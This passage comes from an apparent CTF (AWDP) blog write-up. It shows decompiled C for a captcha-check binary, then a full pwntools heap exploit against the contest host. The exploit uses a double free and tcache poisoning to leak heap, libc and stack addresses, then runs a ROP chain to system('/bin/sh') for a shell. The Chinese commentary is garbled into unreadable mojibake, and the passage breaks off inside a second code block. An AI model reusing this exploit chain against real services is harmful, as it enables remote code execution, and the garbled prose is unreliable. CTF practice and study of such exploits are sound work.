style="color:#393A34">buf</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">    puts</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Captcha wrong!</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#59873A">  putchar</span><span style="color:#1e754f">(</span><span style="color:#2F798A">10</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#DBD7CAEE">__int64 __fastcall </span><span style="color:#80A665">sub_2567</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">a1</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">a2</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676"> !</span><span style="color:#80A665">strcmp</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">a1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> a2</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><span style="color:#758575DD">  // [6]</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">    puts</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Captcha correct!</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Welcome:</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    read</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#CB7676">u</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Your greeting:</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    puts</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">  else</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">    puts</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Captcha wrong!</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#80A665">  putchar</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">10</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>é¢˜ç›® got è¡¨å¯å†™ï¼Œåº”è¯¥æ˜¯æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥å®ç°ä»»æ„å†™æŠŠ <code class="inline-code">puts</code> æ”¹æˆ <code class="inline-code">printf</code>ï¼Œä½†æ˜¯æˆ‘æ¯”èµ›æ—¶å¤ªæ€¥äº†ï¼Œæ²¡çœ‹åˆ°æ€ä¹ˆå®ç°çš„ï¼Œæ‰€ä»¥å°±ç›´æ¥æŠŠ [6] çš„ <code class="inline-code">jnz</code> patch æˆ <code class="inline-code">jz</code> äº†ï¼Œä¸€éè¿‡ï¼Œç¬‘æ­»äº†ã€‚</p>
<p>åˆ°è¿™åŸºæœ¬ä¸Šä¸åˆ° 2h å°± fix ç»“æŸäº†ï¼Œç¾ç¾åƒåˆ†ã€‚</p>
<p>ç„¶åå¼€å§‹ attack</p>
<h3 id="awdp-attack" class="scroll-target"><a href="#awdp-attack"><code class="hash inline-code">#</code>awdp-attack</a></h3>
<p>ä¸Šæ¥å…ˆçœ‹çš„å †é¢˜ï¼Œç™½ç»™çš„ double freeï¼Œä½†æ˜¯æ²¡æœ‰ editï¼Œåªè¦æä¸€ä¸ª uaf è½¬ chunk overlap å°±å¯ä»¥æ‰“ tcache posioning äº†ï¼Œç¨å¾®çœ‹äº†ä¸‹ç¬”è®°ï¼Œhouse of botcake + å †é£æ°´æ¯”è¾ƒé€‚åˆï¼Œç…§ç€ç¬”è®°é‡Œçš„æ¿å­æ‰“äº†ã€‚</p>
<p>å®ç°äº†ä¸€ä¸ª 0x250 çš„ chunk victimB å’Œ 4 ä¸ª 0x80 çš„ chunk é‡å çš„æ•ˆæœï¼Œç„¶åæ‰“ tcache posioning é€šè¿‡ environ æ‰“æ ˆå°±ç»“æŸäº†ã€‚</p>
<p>ä¸€è¡€ï¼Œæ¯”èµ›ç»“æŸæ—¶è¿™ä¸ªé¢˜åƒäº† 1700 åˆ†+ï¼Œå¤ªçˆ½äº†ã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./heap</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">173.33.5.38</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 9999</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> create</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> size</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Index: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Size: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">size</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Data: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Index: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Index: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    create</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaaa</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">victim1</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">victim2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">gap</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">21</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">gap</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">22</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">gap</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">23</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">gap</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">24</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">gap</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">9</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Data: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">heap_base </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">5</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 12</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"heap_base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">heap_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">cookie </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"cookie => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">cookie</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Data: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">21ace0</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># house of botcake çš„å¤±è´¥å°è¯•ï¼Œæ²¡æœ‰ edit åšäº†ç›¸åŒå¤§å°çš„å †å—é‡å ä¹Ÿæ²¡ç”¨</span><br><span style="color:#A0ADA0"># create(9, 0x80, b"gap")</span><br><span style="color:#A0ADA0"># delete(8)</span><br><span style="color:#A0ADA0"># create(10, 0x30, b"gap0")</span><br><span style="color:#A0ADA0"># create(11, 0x40, b"gap1")</span><br><span style="color:#A0ADA0"># create(12, 0x30, b"gap2")</span><br><span style="color:#A0ADA0"># create(13, 0x40, b"gap3")</span><br><br><span style="color:#393A34">environ </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">222200</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">18</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">19</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">9</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">88</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">250</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">delete</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">delete</span><span style="color:#2993a3">(</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">10</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">240</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">88</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">90</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">environ </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">heap_base </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">cookie</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">11</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">12</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">show</span><span style="color:#2993a3">(</span><span style="color:#2F798A">12</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">delete</span><span style="color:#2993a3">(</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">delete</span><span style="color:#2993a3">(</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">13</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">240</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">A</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">88</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">90</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">168</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">heap_base </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">cookie</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">14</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># pause()</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002a3e5</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000f4119</span><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">system</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc_addr</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> system</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#2F798A">15</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaaabbbb</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span 